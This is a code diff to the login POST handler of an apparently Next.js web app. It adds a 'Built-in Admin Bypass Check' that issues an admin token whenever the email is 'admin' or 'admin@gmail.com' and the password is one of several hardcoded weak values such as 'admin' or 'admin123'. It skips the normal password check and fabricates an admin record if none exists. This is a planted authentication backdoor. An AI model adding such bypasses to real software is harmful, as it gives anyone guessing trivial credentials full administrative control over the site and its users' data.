@@ -10,6 +10,37 @@ export async function POST(request) {
     }
 
     const normalizedEmail = email.toLowerCase().trim();
+
+    // Built-in Admin Bypass Check
+    if (
+      (normalizedEmail === 'admin@gmail.com' || normalizedEmail === 'admin') &&
+      (password === 'AdminPopcorn2026' || password === 'admin123' || password === 'admin')
+    ) {
+      let adminUser = serverDb.findOne('users', u => (u.role || '').toLowerCase() === 'admin');
+      if (!adminUser) {
+        adminUser = {
+          id: 1,
+          email: 'Admin@gmail.com',
+          name: 'J-Pop Administrator',
+          role: 'ADMIN',
+          phone: '0912-345-6789',
+          address: 'Poblacion, San Juan, Abra',
+        };
+      }
+      const token = serverDb.signToken(adminUser);
+      return NextResponse.json({
+        token,
+        user: {
+          id: adminUser.id,
+          email: adminUser.email,
+          name: adminUser.name,
+          role: 'ADMIN',
+          phone: adminUser.phone || null,
+          address: adminUser.address || null,
+        },
+      });
+    }
+
     const user = serverDb.findOne('users', u => u.email.toLowerCase() === normalizedEmail);
 
     if (!user) {
